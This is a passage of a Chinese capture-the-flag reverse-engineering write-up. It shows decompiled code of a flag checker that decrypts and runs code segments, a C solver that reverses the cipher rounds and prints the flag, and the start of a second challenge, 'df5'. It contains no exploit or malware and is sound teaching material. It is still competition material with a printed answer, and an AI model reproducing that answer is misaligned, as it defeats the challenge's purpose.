_mm_loadu_si128(&amp;v35[n192 + <span class="number">32</span>]);</span><br><span class="line">            v36[<span class="number">-6</span>] = _mm_xor_si128(_mm_loadu_si128(&amp;v35[n192]), v37);</span><br><span class="line">            v36[<span class="number">-5</span>] = _mm_xor_si128(_mm_loadu_si128(&amp;v35[n192 + <span class="number">16</span>]), _mm_loadu_si128(v36 - <span class="number">5</span>));</span><br><span class="line">            v39 = _mm_loadu_si128(&amp;v35[n192 + <span class="number">48</span>]);</span><br><span class="line">            n192 += <span class="number">64LL</span>;</span><br><span class="line">            v36[<span class="number">-4</span>] = _mm_xor_si128(v38, _mm_loadu_si128(v36 - <span class="number">4</span>));</span><br><span class="line">            v36[<span class="number">-3</span>] = _mm_xor_si128(v39, _mm_loadu_si128(v36 - <span class="number">3</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( n192 &lt; <span class="number">192</span> );</span><br><span class="line">          <span class="keyword">if</span> ( n192 &lt; <span class="number">210</span> )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v33-&gt;m128i_i8[n192] ^= v35[n192];</span><br><span class="line">              ++n192;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( n192 &lt; <span class="number">210</span> );</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(lpAddress[k + <span class="number">1</span>], <span class="number">0</span>, <span class="number">0xD2uLL</span>);</span><br><span class="line">      <span class="built_in">VirtualProtect</span>(lpAddress_1, <span class="number">0xD2uLL</span>, PAGE_EXECUTE_READ, flOldProtect);</span><br><span class="line">      (lpAddress_1)(Buf1, &amp;box);</span><br><span class="line">      <span class="built_in">VirtualProtect</span>(lpAddress_1, <span class="number">0xD2uLL</span>, PAGE_READWRITE, flOldProtect);</span><br><span class="line">    &#125;</span><br><span class="line">    v40 = <span class="built_in">memcmp</span>(Buf1, &amp;Buf2_, <span class="number">0x20uLL</span>);</span><br><span class="line">    right_n = <span class="string">&quot;right\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v40 )</span><br><span class="line">      right_n = <span class="string">&quot;wrong\n&quot;</span>;</span><br><span class="line">    <span class="built_in">sub_7FF67C8E1020</span>(right_n, <span class="string">&quot;wrong\n&quot;</span>, envp_1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_7FF67C8E1020</span>(<span class="string">&quot;wrong\n&quot;</span>, argv_1, envp_2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是加密主要逻辑，对明文的加密段存储在lpAddress中，并且不是一成不变的，这里利用了SSE来进行对加密段的异或，看似复杂，实际上只是实现了同一段代码，经过不同种的异或最终做到不同的加密方式</p><p>还好是一个可以动调的程序，所以只需关注下面的(v30)(Buf1, &amp;box);</p><p>16种加密，每四个一轮，每轮中前两种加密相同，后两种都比较相似，耐心即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box1[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xB0</span>, <span class="number">0xF0</span>, <span class="number">0x21</span>, <span class="number">0xCF</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x3A</span>, <span class="number">0x68</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, <span class="number">0x39</span>, <span class="number">0x86</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x9B</span>, <span class="number">0xF7</span>,</span><br><span class="line">    <span class="number">0x3D</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x1B</span>, <span class="number">0x2E</span>, <span class="number">0x6C</span>, <span class="number">0xDF</span>, <span class="number">0x2C</span>, <span class="number">0xAE</span>, <span class="number">0x65</span>, <span class="number">0x9D</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0xDA</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xCA</span>, <span class="number">0x56</span>, <span class="number">0x92</span>, <span class="number">0x75</span>, <span class="number">0x3B</span>, <span class="number">0x62</span>, <span class="number">0x45</span>, <span class="number">0x06</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x6E</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>, <span class="number">0xA3</span>,</span><br><span class="line">    <span class="number">0xD2</span>, <span class="number">0x44</span>, <span class="number">0xA1</span>, <span class="number">0x4A</span>, <span class="number">0x58</span>, <span class="number">0xB1</span>, <span class="number">0xA0</span>, <span class="number">0x2A</span>, <span class="number">0x47</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0xAF</span>, <span class="number">0x50</span>, <span class="number">0xC3</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0xE5</span>, <span class="number">0x0D</span>, <span class="number">0x67</span>, <span class="number">0x91</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, <span class="number">0xE3</span>, <span class="number">0xC1</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x1C</span>, <span class="number">0x3F</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0x7A</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x9E</span>, <span class="number">0xED</span>, <span class="number">0xA9</span>, <span class="number">0x41</span>, <span class="number">0x20</span>, <span class="number">0xEF</span>, <span class="number">0xA6</span>, <span class="number">0x48</span>, <span class="number">0x97</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0xD4</span>, <span class="number">0xBB</span>, <span class="number">0x23</span>, <span class="number">0x66</span>, <span class="number">0xD9</span>, <span class="number">0xE4</span>, <span class="number">0x0B</span>, <span class="number">0x30</span>, <span class="number">0x15</span>, <span class="number">0xD7</span>, <span class="number">0x6B</span>, <span class="number">0x19</span>, <span class="number">0xCD</span>, <span class="number">0xC4</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xC8</span>, <span class="number">0x14</span>, <span class="number">0xFD</span>, <span class="number">0x7F</span>, <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x6F</span>, <span class="number">0xF5</span>, <span class="number">0x90</span>, <span class="number">0x76</span>, <span class="number">0xBF</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0x24</span>, <span class="number">0x78</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x43</span>, <span class="number">0xB5</span>, <span class="number">0x0C</span>, <span class="number">0x31</span>, <span class="number">0xF9</span>, <span class="number">0xA2</span>, <span class="number">0x9C</span>, <span class="number">0x99</span>, <span class="number">0xF6</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0xDB</span>, <span class="number">0xB7</span>, <span class="number">0xC9</span>, <span class="number">0x85</span>, <span class="number">0x81</span>, <span class="number">0x03</span>, <span class="number">0x64</span>, <span class="number">0x1D</span>, <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x5A</span>, <span class="number">0xBD</span>, <span class="number">0x37</span>, <span class="number">0x4C</span>, <span class="number">0xA7</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xE9</span>, <span class="number">0x35</span>, <span class="number">0x93</span>, <span class="number">0x8D</span>, <span class="number">0xA5</span>, <span class="number">0xFB</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0xC2</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x4D</span>, <span class="number">0xB2</span>, <span class="number">0x10</span>, <span class="number">0x2B</span>, <span class="number">0xF8</span>, <span class="number">0x88</span>, <span class="number">0x6A</span>, <span class="number">0x3E</span>, <span class="number">0xD0</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, <span class="number">0x27</span>, <span class="number">0xBE</span>, <span class="number">0xD5</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0xB6</span>, <span class="number">0x57</span>, <span class="number">0x94</span>, <span class="number">0xAB</span>, <span class="number">0x8A</span>, <span class="number">0xB9</span>, <span class="number">0xBC</span>, <span class="number">0x7D</span>, <span class="number">0xB3</span>, <span class="number">0x96</span>, <span class="number">0x7E</span>, <span class="number">0xFC</span>, <span class="number">0xAD</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xCB</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0x32</span>, <span class="number">0xA4</span>, <span class="number">0x16</span>, <span class="number">0xFE</span>, <span class="number">0x5B</span>, <span class="number">0x13</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x5E</span>, <span class="number">0x8E</span>, <span class="number">0x29</span>, <span class="number">0xF3</span>, <span class="number">0x8F</span>, <span class="number">0x49</span>, <span class="number">0xE6</span>, <span class="number">0x9F</span>, <span class="number">0xF1</span>, <span class="number">0xC5</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x8C</span>, <span class="number">0x11</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xEC</span>, <span class="number">0x00</span>, <span class="number">0xAC</span>, <span class="number">0x89</span>, <span class="number">0xD3</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0xD6</span>, <span class="number">0xBA</span>, <span class="number">0xD8</span>, <span class="number">0x59</span>, <span class="number">0x98</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xC7</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box2[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x19</span>, <span class="number">0x09</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x0B</span>, <span class="number">0x17</span>, <span class="number">0x0A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box3[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0xB7</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0x6B</span>, <span class="number">0xBD</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0x13</span>, <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x43</span>, <span class="number">0xCD</span>, <span class="number">0x6B</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x18</span>, <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x7E</span>, <span class="number">0x9B</span>, <span class="number">0x27</span>, <span class="number">0x4C</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, <span class="number">0x40</span>, <span class="number">0xC9</span>, <span class="number">0x9E</span>, <span class="number">0xC4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box4[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x91</span>, <span class="number">0xDB</span>, <span class="number">0x9F</span>, <span class="number">0x5F</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>, <span class="number">0xBF</span>, <span class="number">0x41</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0xDE</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0xF8</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0xBA</span>, <span class="number">0x6A</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x39</span>, <span class="number">0x9E</span>, <span class="number">0xF3</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x1C</span>, <span class="number">0xE2</span>, <span class="number">0x43</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox1[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getsbox1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sbox1[box1[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrpty</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">char</span> v2[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">31</span>; ++j)</span><br><span class="line">        v2[j] = flag[box2[j]];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">        flag[i] = v2[box2[i]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = sbox1[flag[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 生成 box1 的逆查表</span></span><br><span class="line">    getsbox1();</span><br><span class="line">    <span class="comment">// 初始加密后的 flag，与加密程序中保持一致</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">0x5B</span>, <span class="number">0x2D</span>, <span class="number">0xE9</span>, <span class="number">0x66</span>, <span class="number">0xED</span>, <span class="number">0x39</span>, <span class="number">0x90</span>, <span class="number">0x23</span>, <span class="number">0xAF</span>, <span class="number">0xDA</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>, <span class="number">0xD1</span>, <span class="number">0x0D</span>, <span class="number">0xBB</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x52</span>, <span class="number">0x02</span>, <span class="number">0xB0</span>, <span class="number">0xBA</span>, <span class="number">0x9D</span>, <span class="number">0x52</span>, <span class="number">0xFA</span>, <span class="number">0x67</span>, <span class="number">0xEE</span>, <span class="number">0xA3</span>, <span class="number">0x85</span>, <span class="number">0xA9</span>, <span class="number">0x84</span>, <span class="number">0xE2</span>, <span class="number">0x6F</span></span><br><span class="line">    &#125;;    <span class="type">int</span> length = <span class="number">32</span>;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">7</span>) | (flag[i] &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        flag[i] = (box3[i] ^ flag[i]) - box4[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">6</span>) | (flag[i] &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        flag[i] = box3[i] ^ (flag[i] - box4[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    decrpty(flag, length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">3</span>) | (flag[i] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        flag[i] = (box3[i] ^ flag[i]) - box4[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">5</span>) | (flag[i] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        flag[i] = box3[i] ^ (flag[i] - box4[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    decrpty(flag, length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">4</span>) | (flag[i] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        flag[i] = (box3[i] ^ flag[i]) - box4[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">2</span>) | (flag[i] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">        flag[i] = box3[i] ^ (flag[i] - box4[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    decrpty(flag, length);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">1</span>) | (flag[i] &gt;&gt; <span class="number">7</span>);</span><br><span class="line">        flag[i] = (box3[i] ^ flag[i]) - box4[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">5</span>) | (flag[i] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        flag[i] = box3[i] ^ (flag[i] - box4[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    decrpty(flag, length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//flag&#123;Master_of_5mc_XoR_aDD_r0r!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="df5"><a href="#df5" class="headerlink" title="df5"></a><strong><font style="color:rgb(38, 38, 38);">df5</font></strong></h2><p>这道题难在解密实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *ppbox1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *ppbox2; <span class="comment">// r14</span></span><br><span class="line">  _BYTE *pppbox1; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *ppbox3; <span class="comment">// r15</span></span><br><span class="line">  _BYTE *ppbox4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v14; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v16; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v19; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v21; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v22; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// r8</span></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  __int64 j; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// eax</span></span><br><span class="line">  __int64 v28[<span class="number">4</span>]; <span class="comment">// [rsp+28h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> Buf1[<span class="number">40</span>]; <span class="comment">// [rsp+48h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v28[<span class="number">0</span>] = sub_7FF6C66410E0;</span><br><span class="line">  v28[<span class="number">1</span>] = sub_7FF6C66412A0;</span><br><span class="line">  v28[<span class="number">2</span>] = sub_7FF6C6641610;</span><br><span class="line">  v28[<span class="number">3</span>] = sub_7FF6C66416B0;</span><br><span class="line">  sub_7FF6C6641020(<span class="string">&quot;flag:&quot;</span>, argv, envp);</span><br><span class="line">  scnaf(<span class="string">&quot;%s&quot;</span>, Buf1);</span><br><span class="line">  len = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++len;</span><br><span class="line">  <span class="keyword">while</span> ( Buf1[len] );</span><br><span class="line">  <span class="keyword">if</span> ( len == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    srand(<span class="number">0x1BF52u</span>);</span><br><span class="line">    ppbox1 = pbox1;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    ppbox2 